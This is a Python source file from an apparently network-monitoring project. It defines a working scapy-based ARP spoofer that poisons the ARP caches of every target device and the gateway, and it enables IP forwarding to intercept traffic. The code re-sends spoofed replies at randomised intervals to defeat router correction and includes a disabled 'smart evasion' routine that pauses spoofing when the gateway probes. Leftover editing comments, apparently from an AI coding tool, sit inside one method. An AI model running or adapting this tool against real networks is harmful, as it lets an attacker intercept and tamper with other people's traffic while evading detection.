import time
import threading
import os
import sys
import random
from typing import List, Dict, Set
from scapy.all import ARP, Ether, send, sendp, sniff
from network_monitor.logger import Logger

class ARPSpoofer:
    def __init__(self, interface: str, gateway_ip: str):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = self._get_mac(gateway_ip)
        self.targets = [] # List of (ip, mac) tuples
        self.running = False
        self.lock = threading.Lock()
        
        # Smart Evasion
        self.paused_targets: Dict[str, float] = {} # {ip: pause_until_ts}
        self.pause_duration = 10.0 # Seconds to pause if Gateway asks for a victim
        
        if not self.gateway_mac:
            Logger.warning(f"Could not resolve Gateway MAC for {gateway_ip}")
        else:
            Logger.info(f"Gateway Resolved: {gateway_ip} -> {self.gateway_mac}")

    def _get_mac(self, ip):
        # ... (Same as before, simplified for brevity in this view, but I must provide full content if replacing block)
        # Since I'm using replace_file_content with range, I need to match everything carefully.
        # Actually, let me just provide the new methods and modified loop.
        
        if not ip:
            return None
            
        # 1. Try Scapy's built-in helper
        try:
            from scapy.layers.l2 import getmacbyip
            mac = getmacbyip(ip)
            if mac and mac != "ff:ff:ff:ff:ff:ff":
                return mac
        except:
            pass

        # 2. Try simple ARP ping (retry a few times)
        for _ in range(3):
            try:
                # Need srp
                from scapy.all import srp
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0, iface=self.interface)
                if ans:
                    return ans[0][1].hwsrc
            except:
                pass
            time.sleep(0.5)

        # 3. Try reading system ARP table (MacOS/Linux)
        # MacOS: arp -n <ip>
        try:
            import subprocess
            cmd = ["arp", "-n", ip]
            output = subprocess.check_output(cmd).decode()
            # Example: ? (192.168.100.1) at 4c:1f:cc:d8:e7:90 on en0 ifscope [ethernet]
            if " at " in output:
                parts = output.split(" at ")
                mac_part = parts[1].split()[0]
                # Validate MAC format roughly
                if ":" in mac_part and len(mac_part) == 17:
                    return mac_part
        except:
            pass
            
        return None

    def set_targets(self, devices: List[Dict]):
        """Update the list of targets to spoof."""
        with self.lock:
            # We only spoof valid targets that are NOT the gateway and NOT ourselves
            self.targets = []
            my_ip = self._get_my_ip()
            
            for dev in devices:
                ip = dev['ip']
                mac = dev['mac']
                if ip != self.gateway_ip and ip != my_ip:
                    self.targets.append((ip, mac))

    def _get_my_ip(self):
        import socket
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return ""

    def start(self):
        self._enable_ip_forwarding()
        self.running = True
        
        # Spoofing Thread
        self.thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self.thread.start()
        
        # Smart Evasion Monitor Thread
        # self.monitor_thread = threading.Thread(target=self._monitor_gateway_arp, daemon=True)
        # self.monitor_thread.start()

    def stop(self):
        self.running = False
        if hasattr(self, 'thread'):
            self.thread.join(timeout=1.0)
        self._restore()
        # IP forwarding cleanup is optional, but maybe polite to leave it on or revert? 
        # Usually checking initial state is better, but for now we leave it enabled or disable it?
        # Let's revert it for safety.
        self._disable_ip_forwarding()

    def _monitor_gateway_arp(self):
        """Listens for ARP requests from Gateway. If Gateway asks 'Who has X?', stop spoofing X."""
        Logger.info("Smart Evasion Active: Listening for Gateway ARP checks...")
        
        def _pkt_callback(pkt):
            if not self.running: return
            
            if ARP in pkt:
                arp = pkt[ARP]
                # op=1 is 'who-has'
                if arp.op == 1:
                    # If Gateway is asking
                    if arp.psrc == self.gateway_ip:
                        target_ip = arp.pdst
                        # If asking about one of our targets
                        with self.lock:
                            is_target = any(t[0] == target_ip for t in self.targets)
                        
                        if is_target:
                            Logger.warning(f"Stealth: Gateway asks for {target_ip}. Pausing spoofing for {self.pause_duration}s.")
                            with self.lock:
                                self.paused_targets[target_ip] = time.time() + self.pause_duration

        sniff(iface=self.interface, filter="arp", prn=_pkt_callback, store=0)

    def _spoof_loop(self):
        while self.running:
            with self.lock:
                now = time.time()
                # Clean up expired pauses
                expired = [ip for ip, ts in self.paused_targets.items() if now > ts]
                for ip in expired:
                    del self.paused_targets[ip]
                
                if self.gateway_mac:
                    Logger.debug(f"Sending ARP spoof for {len(self.targets)} targets") # Debug
                    for target_ip, target_mac in self.targets:
                        # Skip if paused
                        if target_ip in self.paused_targets:
                            continue
                            
                        # Tell target I am gateway
                        self._spoof(target_ip, target_mac, self.gateway_ip)
                        # Tell gateway I am target
                        self._spoof(self.gateway_ip, self.gateway_mac, target_ip)
            
            # High Frequency for Stability
            # 0.5s to 0.8s to prevent router correction
            sleep_time = random.uniform(0.5, 0.8)
            time.sleep(sleep_time)

    def _spoof(self, target_ip, target_mac, spoof_ip):
        # op=2 is "is-at" (response)
        # We want the target to think spoof_ip is at OUR mac. 
        # Scapy automatically fills ARP.hwsrc and Ether.src with our interface's MAC if omitted.
        packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        sendp(packet, verbose=False, iface=self.interface)

    def _restore(self):
        Logger.info("Restoring ARP tables...")
        # 1. Broadcast restore for Gateway (Fixes all Users efficiently)
        self.restore_all()
        
        # 2. Fix Gateway's table (Fixes Gateway seeing Users)
        with self.lock:
            if self.gateway_mac:
                # print(f"[*] Restoring Gateway table for {len(self.targets)} targets...")
                for target_ip, target_mac in self.targets:
                    # Restore gateway: Target is at TargetMAC
                    # Send reduced count to speed up exit
                    self._send_restore(self.gateway_ip, self.gateway_mac, target_ip, target_mac, count=1)

    def _send_restore(self, dest_ip, dest_mac, source_ip, source_mac, count=3):
        # We start being honest here.
        # Ether dst = victim/gateway
        # ARP hwsrc = REAL MAC of the IP we are restoring
        packet = Ether(dst=dest_mac) / ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        sendp(packet, count=count, verbose=False, iface=self.interface)

    def restore_all(self):
        """Broadcasts correct ARP info to the entire subnet to fix network connectivity."""
        if not self.gateway_mac:
            return
            
        # print(f"[*] Broadcasting ARP Restore for Gateway {self.gateway_ip}")
        
        # Broadcast: Gateway is at GatewayMAC (Fixes victims)
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst="255.255.255.255", hwdst="ff:ff:ff:ff:ff:ff", psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        sendp(packet, count=3, verbose=False, iface=self.interface)

    def _enable_ip_forwarding(self):
        if sys.platform == "darwin":
            os.system("sysctl -w net.inet.ip.forwarding=1 > /dev/null")
        # Linux
        elif sys.platform.startswith("linux"):
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def _disable_ip_forwarding(self):
        if sys.platform == "darwin":
            os.system("sysctl -w net.inet.ip.forwarding=0 > /dev/null")
        elif sys.platform.startswith("linux"):
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
